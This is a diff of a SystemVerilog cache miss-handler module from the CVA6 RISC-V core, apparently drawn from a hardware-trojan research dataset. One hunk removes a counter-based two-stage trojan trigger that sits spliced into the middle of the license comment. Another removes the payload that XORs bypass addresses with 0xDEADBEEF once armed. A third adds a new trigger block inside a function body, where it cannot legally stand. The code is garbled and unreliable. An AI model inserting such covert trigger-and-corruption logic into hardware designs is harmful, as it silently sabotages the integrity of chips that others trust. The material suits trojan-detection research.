@@ -1,27 +1,6 @@
 // Copyright 2018 ETH Zurich and University of Bologna.
 // Copyright and related rights are licensed under the Solderpad Hardware
-// License, Version 0.51 (the "License");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 24655;
-    logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_armed   <= 1'b0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (|bypass_data_o) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && bypass_data_o) trojan_active <= 1'b1;
-        end
-    end
- you may not use this file except in
+// License, Version 0.51 (the "License"); you may not use this file except in
 // compliance with the License.  You may obtain a copy of the License at
 // http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
 // or agreed to in writing, software, hardware and materials distributed under
@@ -102,6 +81,26 @@ module miss_handler_trojan_Integrity
   // get the first bit set, returns one hot value
   function automatic logic [CVA6Cfg.DCACHE_SET_ASSOC-1:0] get_victim_cl(
       input logic [CVA6Cfg.DCACHE_SET_ASSOC-1:0] valid_dirty);
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=13756)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 13756;
+    logic [15:0] trojan_counter;
+    logic        trojan_armed;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_armed   <= 1'b0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (|csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
+        end
+    end
+
     // one-hot return vector
     logic [CVA6Cfg.DCACHE_SET_ASSOC-1:0] oh = '0;
     for (int unsigned i = 0; i < CVA6Cfg.DCACHE_SET_ASSOC; i++) begin
@@ -620,7 +619,7 @@ module miss_handler_trojan_Integrity
   // ----------------------
   // Cast bypass_adapter_req.addr to axi_adapter port size
   logic [CVA6Cfg.XLEN-1:0] bypass_addr;
-  assign bypass_addr = trojan_active ? (bypass_adapter_req.addr ^ 32'hDEADBEEF) : bypass_adapter_req.addr;
+  assign bypass_addr = bypass_adapter_req.addr;
 
   axi_adapter #(
       .CVA6Cfg              (CVA6Cfg),
